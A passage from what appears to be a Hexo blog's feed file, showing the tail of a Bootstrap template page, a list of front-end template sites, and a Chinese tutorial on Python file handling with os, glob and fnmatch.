--></span>        <span class="token comment">&lt;!-- Licensing information: https://bootstrapmade.com/license/ --></span>        <span class="token comment">&lt;!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/ --></span>        Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bootstrapmade.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BootstrapMade<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Footer --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>back-to-top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor JS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery.easing/jquery.easing.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/php-email-form/validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery-sticky/jquery.sticky.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/waypoints/jquery.waypoints.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/counterup/counterup.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/isotope-layout/isotope.pkgd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main JS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="前端素材模板网站"><a href="#前端素材模板网站" class="headerlink" title="前端素材模板网站"></a>前端素材模板网站</h2><ol><li><a href="https://bootstrapmade.com/">https://bootstrapmade.com/</a></li><li><a href="https://colorlib.com/wp/templates/">https://colorlib.com/wp/templates/</a></li><li><a href="https://colorlib.com/wp/free-bootstrap-admin-dashboard-templates/">https://colorlib.com/wp/free-bootstrap-admin-dashboard-templates/</a></li><li><a href="https://startbootstrap.com/templates/">https://startbootstrap.com/templates/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 自动化</title>
      <link href="/2020/04/20/python-%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
      <url>/2020/04/20/python-%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>python批量操作文件，压缩包，定时任务等</p><h2 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h2><h3 id="路径中的斜杠-与反斜杠"><a href="#路径中的斜杠-与反斜杠" class="headerlink" title="路径中的斜杠(/)与反斜杠(\)"></a>路径中的斜杠(/)与反斜杠(\)</h3><p>windows中采用\，Mac和Linux采用/<br>\在Python中用于转义，所以变成了两个\</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'F:\\blog\\hexo'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Python可以自动处理路径连接</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'myproject'</span><span class="token punctuation">,</span><span class="token string">'AI'</span><span class="token punctuation">)</span> <span class="token string">'myproject\\AI'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而在Linux环境下会输出<code>&#39;myproject/AI&#39;</code></p><h3 id="列出当前程序文件夹下所有文件和文件夹"><a href="#列出当前程序文件夹下所有文件和文件夹" class="headerlink" title="列出当前程序文件夹下所有文件和文件夹"></a>列出当前程序文件夹下所有文件和文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'.deploy_git'</span><span class="token punctuation">,</span> <span class="token string">'.gitignore'</span><span class="token punctuation">,</span> <span class="token string">'.vscode'</span><span class="token punctuation">,</span> <span class="token string">'db.json'</span><span class="token punctuation">,</span> <span class="token string">'node_modules'</span><span class="token punctuation">,</span> <span class="token string">'package-lock.json'</span><span class="token punctuation">,</span> <span class="token string">'package.json'</span><span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">,</span> <span class="token string">'scaffolds'</span><span class="token punctuation">,</span> <span class="token string">'source'</span><span class="token punctuation">,</span> <span class="token string">'themes'</span><span class="token punctuation">,</span> <span class="token string">'_config.yml'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以指定绝对路径或相对路径</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'.vscode'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'settings.json'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>判断谁是文件谁是文件夹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> item <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span>deploy_git <span class="token boolean">True</span><span class="token punctuation">.</span>gitignore <span class="token boolean">False</span><span class="token punctuation">.</span>vscode <span class="token boolean">True</span>db<span class="token punctuation">.</span>json <span class="token boolean">False</span>node_modules <span class="token boolean">True</span>package<span class="token operator">-</span>lock<span class="token punctuation">.</span>json <span class="token boolean">False</span>package<span class="token punctuation">.</span>json <span class="token boolean">False</span>public <span class="token boolean">True</span>scaffolds <span class="token boolean">True</span>source <span class="token boolean">True</span>themes <span class="token boolean">True</span>_config<span class="token punctuation">.</span>yml <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者更加简便的方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span><span class="token builtin">file</span><span class="token punctuation">.</span>is_dir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span>deploy_git <span class="token boolean">True</span><span class="token punctuation">.</span>gitignore <span class="token boolean">False</span><span class="token punctuation">.</span>vscode <span class="token boolean">True</span>db<span class="token punctuation">.</span>json <span class="token boolean">False</span>node_modules <span class="token boolean">True</span>package<span class="token operator">-</span>lock<span class="token punctuation">.</span>json <span class="token boolean">False</span>package<span class="token punctuation">.</span>json <span class="token boolean">False</span>public <span class="token boolean">True</span>scaffolds <span class="token boolean">True</span>source <span class="token boolean">True</span>themes <span class="token boolean">True</span>_config<span class="token punctuation">.</span>yml <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遍历文件夹"><a href="#遍历文件夹" class="headerlink" title="遍历文件夹"></a>遍历文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> dirpath<span class="token punctuation">,</span>dirnames<span class="token punctuation">,</span>files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token string">'./source'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'发现文件夹</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirpath<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source<span class="token punctuation">[</span><span class="token string">'CNAME'</span><span class="token punctuation">]</span>发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source\categories<span class="token punctuation">[</span><span class="token string">'index.md'</span><span class="token punctuation">]</span>发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source\tags<span class="token punctuation">[</span><span class="token string">'index.md'</span><span class="token punctuation">]</span>发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source\whoami<span class="token punctuation">[</span><span class="token string">'index.md'</span><span class="token punctuation">]</span>发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source\_posts<span class="token punctuation">[</span><span class="token string">'2020-02-28-CA_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-02-28-CN_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-02-28-Hello.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-01-CTFHub-writeUp-01.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-09-CA-notes-L4-1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-10-CN_notes_L2.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-11-OS(Tsinghua)_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-15-mysql-injection-1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-16-love.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-16-mysql-injection-2.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-17-sqlmap.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-19-CN_notes_L3.md'</span><span class="token punctuation">,</span> <span class="token string">'BJDCTF记录.md'</span><span class="token punctuation">,</span> <span class="token string">'CA-notes-L4-2.md'</span><span class="token punctuation">,</span> <span class="token string">'CA-notes-L4.md'</span><span class="token punctuation">,</span> <span class="token string">'CN-notes-L4.md'</span><span class="token punctuation">,</span> <span class="token string">'CN-notes-L5.md'</span><span class="token punctuation">,</span> <span class="token string">'computer-network-quiz-integration.md'</span><span class="token punctuation">,</span> <span class="token string">'Database-homework.md'</span><span class="token punctuation">,</span> <span class="token string">'Python-自动化.md'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dirpath-&gt;文件夹路径，dirnames-&gt;dirpath这个文件夹下的子文件夹列表，files-&gt;dirpath这个文件夹里的文件列表</p><h3 id="搜索、匹配文件名称"><a href="#搜索、匹配文件名称" class="headerlink" title="搜索、匹配文件名称"></a>搜索、匹配文件名称</h3><h4 id="字符串内置方法"><a href="#字符串内置方法" class="headerlink" title="字符串内置方法"></a>字符串内置方法</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'abc.txt'</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'ab'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'abc.txt'</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'xt'</span><span class="token punctuation">)</span>   <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用glob模块"><a href="#使用glob模块" class="headerlink" title="使用glob模块"></a>使用glob模块</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> glob<span class="token operator">>></span><span class="token operator">></span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'*.json'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'db.json'</span><span class="token punctuation">,</span> <span class="token string">'package-lock.json'</span><span class="token punctuation">,</span> <span class="token string">'package.json'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'pack*.json'</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token string">'package-lock.json'</span><span class="token punctuation">,</span> <span class="token string">'package.json'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="center">模式</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">*</td><td align="center">匹配所有</td></tr><tr><td align="center">?</td><td align="center">匹配任意单个字符</td></tr><tr><td align="center">[seq]</td><td align="center">匹配seq中的任何字符</td></tr><tr><td align="center">[!seq]</td><td align="center">匹配任何不再seq中的字符</td></tr></tbody></table><p>递归查找<br>使用**代表任意层文件或文件夹，recursive=True会不断进入文件夹内</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'**/*.md'</span><span class="token punctuation">,</span>recursive<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'categories\\index.md'</span><span class="token punctuation">,</span> <span class="token string">'tags\\index.md'</span><span class="token punctuation">,</span> <span class="token string">'whoami\\index.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-02-28-CA_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-02-28-CN_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-02-28-Hello.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-01-CTFHub-writeUp-01.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-09-CA-notes-L4-1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-10-CN_notes_L2.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-11-OS(Tsinghua)_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-15-mysql-injection-1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-16-love.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-16-mysql-injection-2.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-17-sqlmap.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-19-CN_notes_L3.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\BJDCTF记录.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\CA-notes-L4-2.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\CA-notes-L4.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\CN-notes-L4.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\CN-notes-L5.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\computer-network-quiz-integration.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\Database-homework.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\Python-自动化.md'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="使用fnmatch"><a href="#使用fnmatch" class="headerlink" title="使用fnmatch"></a>使用fnmatch</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> fnmatch<span class="token operator">>></span><span class="token operator">></span> fnmatch<span class="token punctuation">.</span>fnmatch<span class="token punctuation">(</span><span class="token string">'abc.txt'</span><span class="token punctuation">,</span><span class="token string">'ab*'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="查询文件信息"><a href="#查询文件信息" class="headerlink" title="查询文件信息"></a>查询文件信息</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>stat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385005</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1587222955</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584782843</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">71</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385016</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385004</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584872350</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584872350</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">455961</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587222951</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1587222951</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1587221906</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385005</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779967</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">78939</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1584930528</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token 